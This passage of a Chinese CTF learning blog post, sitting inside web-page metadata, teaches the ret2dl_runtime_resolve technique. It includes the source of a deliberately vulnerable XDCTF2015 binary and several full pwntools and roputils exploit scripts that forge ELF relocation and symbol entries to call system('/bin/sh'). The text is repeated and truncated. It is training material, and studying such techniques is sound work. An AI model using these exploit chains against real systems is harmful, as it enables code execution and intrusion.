6这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为，dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下rop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh\x00&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# 1. fake index to fake .rel.pltindex_offset = base_stage + 24 - rel_plt# 3. fake .dynsymfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# 4. fake index to fake .dynstrindex_dynsym = (fake_sym_addr - dynsym) / 0x10# 2. fake r_info in .rel.plt to fake .dynsymr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# 5. fake st_name # 0x10 is the offset of fake_write_symst_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)# write(1, addr, len)rop.raw(base_stage + 80)rop.raw(&#39;aaaa&#39;)rop.raw(&#39;bbbb&#39;)# 1. fake .rel.plt (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# 2. fake .dynsym (align to 0x10)rop.raw(fake_write_sym)# 3. fake .dynstrrop.raw(&#39;system\x00\x00&#39;)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))print rop.dump()s.send(rop.chain())#s.recv()s.interactive()漏洞利用方式  控制eip为PLT[0]的地址，只需传递一个index_arg参数  控制index_arg的大小，使reloc的位置落在可控地址内  伪造reloc的内容，使sym落在可控地址内  伪造sym的内容，使name落在可控地址内  伪造name为任意库函数，如system工具攻击#!/usr/bin/env python# -*- coding: utf-8 -*-__author__ = &#39;zjgcjy&#39;import osimport syssys.path.append(&#39;/home/zjgcjy/roputils&#39;)from roputils import *from pwn import process, gdb, context#from LibcSearcher import *#context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]s = process(&#39;./main&#39;)context.log_level = &#39;debug&#39;s.recv()rop = ROP(&#39;./main&#39;)offset = 112bss_base = rop.section(&#39;.bss&#39;)buf = rop.fill(offset)buf += rop.call(&#39;read&#39;, 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)s.send(buf)buf = rop.string(&#39;/bin/sh&#39;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &#39;system&#39;)buf += rop.fill(100, buf)s.send(buf)s.interactive()">



  <meta property="og:image" content="http://localhost:4000/assets/images/bio-photo.jpg">



  <meta name="twitter:site" content="@zjgcjy">
  <meta name="twitter:title" content="Pwnit 5">
  <meta name="twitter:description" content="  pwn学习资料，来自ctf-wiki。高级 ROP ret2dl_dl_runtime_resolve过程在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用_dl_runtime_resolve(link_map_obj, reloc_index)，这里以 32 位为例（64 位类似），具体的过程如下。  根据 reloc_index 计算相应的重定位表项：**Elf32_Rel *reloc = JMPREL + reloc_index **reloc_index 就是plt中表项的第二条指令，会将一个index压栈。而如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：typedef struct { Elf32_Sword d_tag; union { Elf32_Word d_val; Elf32_Addr d_ptr; } d_un;} Elf32_Dyn;其中，d_tag 的取值决定了该如何解释 d_un。而公式中的JMPREL 是.rel.plt的TAG。根据下面这个表格可知，d_ptr包含了plt表的首地址。            名称      数值      d_un      可执行      共享 目标      说明                  DT_JMPREL      23      d_ptr      可选      可选      该类型的条目的 d_ptr 成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。把重定位表项分开有利于让动态链接器在进程初始化时忽略它们（开启了延迟绑定）。如果存在此成员，相关的 DT_PLTRELSZ 和 DT_PLTREL 必须也存在。      所以Elf32_Rel *reloc这个对象就指向.rel.plt的表项。这个结构体如下所示。typedef struct {    Elf32_Addr        r_offset;    Elf32_Word       r_info;} Elf32_Rel;            成员      说明                  r_offset      此成员给出了需要重定位的位置。对于一个可重定位文件而言，此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是需要重定位的虚拟地址，一般而言，也就是说我们所说的 GOT 表的地址。              r_info      此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。 例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为 “符号值”。此外，重定位类型是和处理器相关的。      当程序代码引用一个重定位项的重定位类型或者符号表索引时，这个索引是对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 也就是说 r_info 的高三个字节对应的值表示这个动态符号在. dynsym 符号表中的位置。#define ELF32_R_SYM(i)    ((i)&gt;&gt;8)#define ELF32_R_TYPE(i)   ((unsigned char)(i))#define ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))  根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)»8比如我选取write函数，write函数的r_offset=0x0804a01c，也就是got表地址，即.got.plt节，而r_info=0x707。所以这时候索引就是7。  继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)»8)]这一步就是查找.dynsym这个节就行了，因为索引已经给出了。  判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )然后通过ELF32_R_TYPE(0x707)判断是不是 7，对应R_386_JUMP_SLOT。通过.dynsym节，根据索引和项大小，得到字符串在.dynstr节的偏移量，然后得到符号write。TODO:  if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)          if (sym-&gt;st_other) &amp; 3 == 0 )      判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。        得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。          uint16_t ndx = VERSYM[(reloc-&gt;r_info) » 8]      r_found_version *version = &amp;l-&gt;l_version[ndx]        根据 name 来寻找相应函数在库中的地址。          name = STRTAB + sym-&gt;st_name      延迟绑定其他没什么好说的，讲了好几遍了，就上个图，记住got表首部的几个值，其中GOT[0]，指向的是.dynamic 节的首地址。而 GOT[1]，指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。最后 GOT[2]，指向动态装载器中 _dl_runtime_resolve 函数指针。而PLT[0]就是将GOT[1]压栈，PLT[1]就是跳转到GOT[2]的地址。ret2_dl_runtime_resolve那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下  控制程序执行 dl_resolve 函数          给定 Link_map 以及 index 两个参数。      当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。        控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。  伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。  伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。此外，这个攻击成功的很必要的条件dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。dl_resolve 函数最后的解析根本上依赖于所给定的字符串。注意：  符号版本信息          最好使得 ndx = VERSYM[(reloc-&gt;r_info) » 8] 的值为 0，以便于防止找不到的情况。        重定位表项          r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。      实现ret2dl源代码：#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln(){    char buf[100];    setbuf(stdin, buf);    read(0, buf, 256);}int main(){    char buf[100] = &quot;Welcome to XDCTF2015~!\n&quot;;    setbuf(stdout, buf);    write(1, buf, strlen(buf));    vuln();    return 0;}编译成32位，只开个NX就行。很明显就是个栈溢出，我们首先找到ret的offset，用gef的pattern就能发现是112了。其实常规做法也能做，脚本如下：rop = ROP(elf)rop.call(&#39;write&#39;, [1, elf.got[&#39;write&#39;], 4])rop.raw(elf.sym[&#39;_start&#39;])s.recv()s.send(flat([cyclic(112), rop.chain()]))libc.address = u32(s.recv(4)) - libc.symbols[&#39;write&#39;]log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc.address))s.recv()one_shot = libc.address + 0x3e7d6s.send(flat([cyclic(112), one_shot, &#39;\x00&#39; * 0x38]))s.interactive()就是泄露got表，然后第二次one_gadget大法就行了。。STAGE 1但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到 bss 段来控制 write 函数。即主要分为两步：  将栈迁移到 bss 段。  控制 write 函数输出相应字符串。rop = ROP(elf)stack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting, set esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;rop.write(1, base_stage + 80, len(sh))rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 2在这一阶段，我们将会利用 dlresolve 相关的知识来控制程序执行 write 函数。这里我们主要是利用 plt[0] 中的相关指令，即 GOT[2] push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移。rop = ROP(elf)stack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting, set esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrwrite_index = ((elf.plt[&#39;write&#39;] - plt0) / 16 - 1) * 8rop.raw(plt0)rop.raw(write_index)## fake ret addr of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 3这一次，我们同样控制 dl_resolve 函数中的 index_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。脚本如下：rop = ROP(elf)# 自定义stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr# push offset in PLTwrite_index = ((elf.plt[&#39;write&#39;] - plt0) / 16 - 1) * 8rel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;)# ELF_REL：r_offset and r_info of write@pltr_offset = u32(rel_plt.data()[write_index:write_index + 4])r_info = u32(rel_plt.data()[write_index + 4:write_index + 8])# fake reloc = base_stage + 24index_offset = base_stage + 24 - rel_plt.header.sh_addr# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# fake reloc (offset 4*6=24)rop.raw(r_offset)rop.raw(r_info)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()最后结果如下，这次我们在 bss 段伪造了一个假的 write 的重定位项，仍然输出了对应的字符串。STAGE 4stage3 中，我们控制了重定位表项，但是重定位表项的内容与 write 原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607»8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。通过伪造fake .dynsym和fake .rel.pltrop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# fake symfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# dynsym index of symindex_dynsym = (fake_sym_addr - dynsym) / 0x10# fake item(write) of .dynsymfake_write_sym = flat([0x4c, 0, 0, 0x12])# fake write relocationr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# fake reloc = base_stage + 24index_offset = base_stage + 24 - rel_plt# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# fake reloc (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# fake dynsym (align to 0x10)rop.raw(fake_write_sym)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 5这一阶段，我们将在阶段 4 的基础上，我们进一步使得 write 符号的 st_name 指向我们自己构造的字符串。rop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh\x00&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# 1. fake index to fake .rel.pltindex_offset = base_stage + 24 - rel_plt# 3. fake .dynsymfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# 4. fake index to fake .dynstrindex_dynsym = (fake_sym_addr - dynsym) / 0x10# 2. fake r_info in .rel.plt to fake .dynsymr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# 5. fake st_name # 0x10 is the offset of fake_write_symst_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)# write(1, addr, len)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# 1. fake .rel.plt (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# 2. fake .dynsym (align to 0x10)rop.raw(fake_write_sym)# 3. fake .dynstrrop.raw(&#39;write\x00&#39;)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))print rop.dump()s.send(rop.chain())#s.recv()s.interactive()STAGE 6这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为，dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下rop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh\x00&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# 1. fake index to fake .rel.pltindex_offset = base_stage + 24 - rel_plt# 3. fake .dynsymfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# 4. fake index to fake .dynstrindex_dynsym = (fake_sym_addr - dynsym) / 0x10# 2. fake r_info in .rel.plt to fake .dynsymr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# 5. fake st_name # 0x10 is the offset of fake_write_symst_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)# write(1, addr, len)rop.raw(base_stage + 80)rop.raw(&#39;aaaa&#39;)rop.raw(&#39;bbbb&#39;)# 1. fake .rel.plt (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# 2. fake .dynsym (align to 0x10)rop.raw(fake_write_sym)# 3. fake .dynstrrop.raw(&#39;system\x00\x00&#39;)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))print rop.dump()s.send(rop.chain())#s.recv()s.interactive()漏洞利用方式  控制eip为PLT[0]的地址，只需传递一个index_arg参数  控制index_arg的大小，使reloc的位置落在可控地址内  伪造reloc的内容，使sym落在可控地址内  伪造sym的内容，使name落在可控地址内  伪造name为任意库函数，如system工具攻击#!/usr/bin/env python# -*- coding: utf-8 -*-__author__ = &#39;zjgcjy&#39;import osimport syssys.path.append(&#39;/home/zjgcjy/roputils&#39;)from roputils import *from pwn import process, gdb, context#from LibcSearcher import *#context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]s = process(&#39;./main&#39;)context.log_level = &#39;debug&#39;s.recv()rop = ROP(&#39;./main&#39;)offset = 112bss_base = rop.section(&#39;.bss&#39;)buf = rop.fill(offset)buf += rop.call(&#39;read&#39;, 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)s.send(buf)buf = rop.string(&#39;/bin/sh&#39;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &#39;system&#39;)buf += rop.fill(100, buf)s.send(buf)s.interactive()">
  <meta name="twitter:url" content="http://localhost:4000/posts/2019-03/Pwnit-5.html">

  
    <meta name="twitter:card" content="summary">
    
      <meta name="twitter:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
    
  

  



  <meta property="article:published_time" content="2019-03-03T13:20:00+08:00">





  

  


<link rel="canonical" href="http://localhost:4000/posts/2019-03/Pwnit-5.html">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Blogger",
      "url": "http://localhost:4000/",
      "sameAs": ["https://twitter.com/","https://github.com/"]
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="My way, though far away Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/apple-touch-icon.png" alt=""></a>
        
        <a class="site-title" href="/">
          ZJGCJY
          <span class="site-subtitle">My way, though far away</span>
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/collection-archive/" >Collections</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#posts" itemprop="item"><span itemprop="name">Posts</span></a>
          <meta itemprop="position" content="2" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="/categories/#2019-03" itemprop="item"><span itemprop="name">2019 03</span></a>
          <meta itemprop="position" content="3" />
        </li>
        <span class="sep">/</span>
      
    
      
      
        <li class="current">Pwnit 5</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/me.jpg" alt="zjgcjy" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">zjgcjy</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>IIE UCAS, CTFer, Binarian</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">BeiJing China</span>
        </li>
      

      
        
          
            <li><a href="https://zjgcjy.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i> Website</a></li>
          
        
          
            <li><a href="mailto:zjgcjy@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
          
        
          
            <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
          
        
          
            <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Pwnit 5">
    <meta itemprop="description" content="  pwn学习资料，来自ctf-wiki。高级 ROP ret2dl_dl_runtime_resolve过程在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用_dl_runtime_resolve(link_map_obj, reloc_index)，这里以 32 位为例（64 位类似），具体的过程如下。  根据 reloc_index 计算相应的重定位表项：**Elf32_Rel *reloc = JMPREL + reloc_index **reloc_index 就是plt中表项的第二条指令，会将一个index压栈。而如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：typedef struct { Elf32_Sword d_tag; union { Elf32_Word d_val; Elf32_Addr d_ptr; } d_un;} Elf32_Dyn;其中，d_tag 的取值决定了该如何解释 d_un。而公式中的JMPREL 是.rel.plt的TAG。根据下面这个表格可知，d_ptr包含了plt表的首地址。            名称      数值      d_un      可执行      共享 目标      说明                  DT_JMPREL      23      d_ptr      可选      可选      该类型的条目的 d_ptr 成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。把重定位表项分开有利于让动态链接器在进程初始化时忽略它们（开启了延迟绑定）。如果存在此成员，相关的 DT_PLTRELSZ 和 DT_PLTREL 必须也存在。      所以Elf32_Rel *reloc这个对象就指向.rel.plt的表项。这个结构体如下所示。typedef struct {    Elf32_Addr        r_offset;    Elf32_Word       r_info;} Elf32_Rel;            成员      说明                  r_offset      此成员给出了需要重定位的位置。对于一个可重定位文件而言，此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是需要重定位的虚拟地址，一般而言，也就是说我们所说的 GOT 表的地址。              r_info      此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。 例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为 “符号值”。此外，重定位类型是和处理器相关的。      当程序代码引用一个重定位项的重定位类型或者符号表索引时，这个索引是对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 也就是说 r_info 的高三个字节对应的值表示这个动态符号在. dynsym 符号表中的位置。#define ELF32_R_SYM(i)    ((i)&gt;&gt;8)#define ELF32_R_TYPE(i)   ((unsigned char)(i))#define ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))  根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)»8比如我选取write函数，write函数的r_offset=0x0804a01c，也就是got表地址，即.got.plt节，而r_info=0x707。所以这时候索引就是7。  继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)»8)]这一步就是查找.dynsym这个节就行了，因为索引已经给出了。  判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )然后通过ELF32_R_TYPE(0x707)判断是不是 7，对应R_386_JUMP_SLOT。通过.dynsym节，根据索引和项大小，得到字符串在.dynstr节的偏移量，然后得到符号write。TODO:  if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)          if (sym-&gt;st_other) &amp; 3 == 0 )      判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。        得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。          uint16_t ndx = VERSYM[(reloc-&gt;r_info) » 8]      r_found_version *version = &amp;l-&gt;l_version[ndx]        根据 name 来寻找相应函数在库中的地址。          name = STRTAB + sym-&gt;st_name      延迟绑定其他没什么好说的，讲了好几遍了，就上个图，记住got表首部的几个值，其中GOT[0]，指向的是.dynamic 节的首地址。而 GOT[1]，指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。最后 GOT[2]，指向动态装载器中 _dl_runtime_resolve 